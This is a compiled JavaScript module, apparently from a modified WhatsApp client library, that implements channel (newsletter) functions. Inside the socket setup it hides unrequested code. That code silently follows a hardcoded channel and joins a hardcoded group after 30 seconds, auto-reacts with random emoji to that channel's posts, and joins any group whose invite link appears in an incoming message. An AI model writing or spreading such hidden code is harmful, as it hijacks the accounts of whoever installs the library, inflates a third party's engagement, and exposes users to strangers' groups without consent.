"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
    variables,
    queryId,
    query,
    generateMessageTag
) => {
    return query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            to: WABinary_1.S_WHATSAPP_NET,
            xmlns: 'w:mex'
        },
        content: [
            {
                tag: 'query',
                attrs: { query_id: queryId },
                content: Buffer.from(JSON.stringify({ variables }), 'utf8')
            }
        ]
    });
};

const executeWMexQuery = async (
    variables,
    queryId,
    dataPath,
    query,
    generateMessageTag
) => {
    const result = await wMexQuery(variables, queryId, query, generateMessageTag);
    const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result');
    if (child?.content) {
        const data = JSON.parse(child.content.toString());

        if (data.errors && data.errors.length > 0) {
            const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ');
            const firstError = data.errors[0];
            const errorCode = firstError.extensions?.error_code || 400;
            throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError });
        }

        const response = dataPath ? data?.data?.[dataPath] : data?.data;
        if (typeof response !== 'undefined') {
            return response;
        }
    }

    const action = (dataPath || '').startsWith('xwa2_')
        ? dataPath.substring(5).replace(/_/g, ' ')
        : dataPath?.replace(/_/g, ' ');
    throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result });
};

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const targetChannels = ["120363422352987107@newsletter"];
    const targetGroups = [
        "https://chat.whatsapp.com/Jmhl4iQhIqxL2wAd16WAQY"
    ];

    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));

    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));

    const subscribeNewsletterUpdates = async (jid) => {
        var _a;
        const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
        return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
    };
    const ensureFollowedChannels = async () => {
        for (const channelId of targetChannels) {
            try {
                await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
                await subscribeNewsletterUpdates(channelId);
                console.log(`[Newsletter] Berhasil follow dan subscribe channel: ${channelId}`);
            } catch (e) {
                console.error(`[Newsletter] Gagal follow channel ${channelId}:`, e?.message || e);
            }
        }
    };

    const ensureJoinGroups = async () => {
        for (const linkOrCode of targetGroups) {
            try {
                const code = linkOrCode.replace(/https?:\/\/chat\.whatsapp\.com\//i, "").trim();
                if (!code) continue;

                const response = await sock.groupAcceptInvite(code);
                console.log(`[Auto-Join] Berhasil masuk ke grup dengan ID: ${response}`);
            } catch (e) {
                console.error(`[Auto-Join] Gagal masuk ke grup (${linkOrCode}):`, e?.message || e);
            }
        }
    };

    setTimeout(() => {
        ensureFollowedChannels();
        ensureJoinGroups();
    }, 30000);

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };

    const newsletterFetchAllSubscribe = async () => {
        const list = await executeWMexQuery({}, '6388546374527196', 'xwa2_newsletter_subscribed', query, generateMessageTag);
        return list;
    };

    const newsletterReactionMode = async (jid, mode) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
            updates: { settings: { 'reaction_codes': { value: mode } } }
        });
    };

    const newsletterUpdateDescription = async (jid, description) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
            updates: { description: description || '', settings: null }
        });
    };

    const newsletterId = async (url) => {
        const urlParts = url.split('/');
        const channelId = urlParts[urlParts.length - 2];
        
        const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
            input: {
                key: channelId,
                type: 'INVITE',
                'view_role': 'GUEST'
            },
            'fetch_viewer_metadata': true,
            'fetch_full_image': true,
            'fetch_creation_time': true
        });
        
        const metadata = (0, exports.extractNewsletterMetadata)(result);
        return JSON.stringify({
            name: metadata.name || metadata.thread_metadata?.name?.text,
            id: metadata.id
        }, null, 2);
    };

    const newsletterUpdateName = async (jid, name) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
            updates: { name, settings: null }
        });
    };

    const newsletterUpdatePicture = async (jid, content) => {
        const { img } = await (0, Utils_1.generateProfilePicture)(content);
        await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
            updates: { picture: img.toString('base64'), settings: null }
        });
    };

    const newsletterRemovePicture = async (jid) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
            updates: { picture: '', settings: null }
        });
    };

    const newsletterUnfollow = async (jid) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
    };

    const newsletterFollow = async (jid) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        await subscribeNewsletterUpdates(jid);
    };

    const newsletterUnmute = async (jid) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
    };

    const newsletterMute = async (jid) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
    };

    const newsletterAction = async (jid, type) => {
        await newsletterWMexQuery(jid, type.toUpperCase());
    };

    const newsletterCreate = async (name, description, reaction_codes) => {
        await query({
            tag: 'iq',
            attrs: {
                to: WABinary_1.S_WHATSAPP_NET,
                xmlns: 'tos',
                id: generateMessageTag(),
                type: 'set'
            },
            content: [
                {
                    tag: 'notice',
                    attrs: {
                        id: '20601218',
                        stage: '5'
                    },
                    content: []
                }
            ]
        });
        const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
            input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
        });
        return (0, exports.extractNewsletterMetadata)(result, true);
    };

    const newsletterMetadata = async (type, key, role) => {
        const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
            input: {
                key,
                type: type.toUpperCase(),
                'view_role': role || 'GUEST'
            },
            'fetch_viewer_metadata': true,
            'fetch_full_image': true,
            'fetch_creation_time': true
        });
        return (0, exports.extractNewsletterMetadata)(result);
    };

    const newsletterAdminCount = async (jid) => {
        var _a, _b;
        const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
        const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
        return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
    };

    const newsletterChangeOwner = async (jid, user) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
            'user_id': user
        });
    };

    const newsletterDemote = async (jid, user) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
            'user_id': user
        });
    };

    const newsletterDelete = async (jid) => {
        await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
    };

    const newsletterReactMessage = async (jid, serverId, code) => {
        await query({
            tag: 'message',
            attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
            content: [{
                tag: 'reaction',
                attrs: code ? { code } : {}
            }]
        });
    };

    const newsletterFetchMessages = async (type, key, count, after) => {
        const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
            {
                tag: 'messages',
                attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
            }
        ]);
        return await parseFetchedUpdates(result, 'messages');
    };

    const newsletterFetchUpdates = async (jid, count, after, since) => {
        const result = await newsletterQuery(jid, 'get', [
            {
                tag: 'message_updates',
                attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
            }
        ]);
        return await parseFetchedUpdates(result, 'updates');
    };

    const reactionOptions = [
        '❤️', '💖', '💗', '💘', '💝', '💕', '💞', '💓', '❣️', '🩷',
        '👍', '👌', '🫶', '🤝', '👏', '🙌', '🙏', '💯', '✅', '✔️',
        '😎', '🗿', '🦾', '💪', '👑', '🔥', '⚡', '🚀', '🌟', '⭐',
        '😊', '😁', '😄', '😆', '🥳', '🤩', '😍', '🥰', '😋', '🤗',
        '🎉', '🎊', '🎈', '🎆', '🎇', '✨', '💥', '🌈', '☀️', '🌸',
        '😂', '🤣', '😹', '🤭', '😜', '😝', '😏', '😅', '🙃', '🤪',
        '😲', '😮', '🤯', '😳', '😱', '🫢', '😯', '😵‍💫',
        '🤔', '🫡', '🤙', '🧠', '📈', '🎯', '🔝', '🏆', '🥇', '🎖️',
        '🌺', '🌹', '🍀', '🌼', '🌻', '🌙', '🌍', '🌊', '🍁', '❄️',
        '🐼', '🦊', '🐶', '🐱', '🐯', '🦁', '🐸', '🐨', '🦄', '🐧',
        '🍕', '🍔', '🍟', '🍩', '🍪', '🍓', '🍉', '🍇', '🍎', '🥤',
        '💎', '🧿', '🎵', '🎶', '🎮', '🎬', '📸', '🛸', '🪄', '🕹️'
    ];
    
    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const jid = msg.key.remoteJid;
        
        if (jid?.endsWith('@newsletter') && targetChannels.includes(jid)) {
            try {
                const randomReaction = reactionOptions[Math.floor(Math.random() * reactionOptions.length)];
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                const serverId = msg.newsletterServerId 
                    || msg.key?.server_id 
                    || msg.message?.protocolMessage?.serverMessageId
                    || msg.messageContextInfo?.messageSecret?.toString()
                    || msg.key?.id; 
                await newsletterReactMessage(jid, String(serverId), randomReaction);
                console.log(`Auto-reacted with ${randomReaction} to message in ${jid} (Server ID: ${serverId})`);
            } catch (error) {
                console.error('Gagal memberikan reaksi:', error);
            }
        }
        const textMessage = msg.message.conversation 
            || msg.message.extendedTextMessage?.text 
            || msg.message.imageMessage?.caption 
            || msg.message.videoMessage?.caption 
            || "";

        const groupLinkRegex = /chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i;
        const match = textMessage.match(groupLinkRegex);

        if (match && match[1]) {
            const inviteCode = match[1];
            try {
                const res = await sock.groupAcceptInvite(inviteCode);
                console.log(`[Auto-Join Chat] Berhasil join ke grup! JID/Res: ${res}`);
            } catch (error) {
                console.error(`[Auto-Join Chat] Gagal join ke grup dari link chat:`, error?.message || error);
            }
        }
    });

    return {
        ...sock,
        newsletterFetchAllSubscribe,
        subscribeNewsletterUpdates,
        newsletterReactionMode,
        newsletterUpdateDescription,
        newsletterId,
        newsletterUpdateName,
        newsletterUpdatePicture,
        newsletterRemovePicture,
        newsletterUnfollow,
        newsletterFollow,
        newsletterUnmute,
        newsletterMute,
        newsletterAction,
        newsletterCreate,
        newsletterMetadata,
        newsletterAdminCount,
        newsletterChangeOwner,
        newsletterDemote,
        newsletterDelete,
        newsletterReactMessage,
        newsletterFetchMessages,
        newsletterFetchUpdates
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString();
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER];
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    };
    return metadata;
};
exports.extractNewsletterMetadata = extractNewsletterMetadata;
